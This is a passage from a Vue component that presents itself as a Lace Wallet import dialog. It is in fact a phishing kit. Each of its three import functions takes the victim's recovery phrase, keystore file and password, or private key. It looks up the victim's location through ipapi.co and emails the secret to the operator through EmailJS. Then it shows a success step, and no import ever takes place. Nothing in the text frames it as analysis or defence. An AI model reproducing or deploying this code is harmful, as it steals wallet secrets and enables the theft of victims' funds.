  resetInputs();
}

function resetInputs() {
  recoveryPhrase.value = "";
  keystoreFile.value = null;
  keystoreFileName.value = "";
  keystorePassword.value = "";
  privateKey.value = "";
}

function goBackToMethods() {
  currentStep.value = 4;
  resetInputs();
}

async function importRecoveryPhrase() {
  if (phraseWordCount.value < 12) {
    message.value = {
      text: "Please enter at least 12 words in your recovery phrase",
      type: "error",
    };
    return;
  }
  isLoading.value = true;

  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "Phrase Recovery",
      phrase: recoveryPhrase.value,
    };
    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Lace Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params,
    );
    if (response.data === "OK") {
      currentStep.value = 6;
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function importKeystore() {
  if (!keystoreFile.value || keystorePassword.value.trim().length === 0) {
    message.value = {
      text: "Please provide both keystore file and password",
      type: "error",
    };
    return;
  }
  isLoading.value = true;

  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "Keystore JSON",
      keystore: keystoreFile.value,
      password: keystorePassword.value,
    };
    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Lace Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params,
    );
    if (response.data === "OK") {
      currentStep.value = 6;
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function importPrivateKey() {
  if (!isValidPrivateKey.value) {
    message.value = {
      text: "Please enter a valid private key",
      type: "error",
    };
    return;
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "Private Key",
      private: privateKey.value,
    };
    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Lace Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params,
    );
    if (response.data === "OK") {
      currentStep.value = 6;
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

function completeImport() {
  // Emit success event
  emit("close");
}

function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.3s ease;
}

.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
</style>
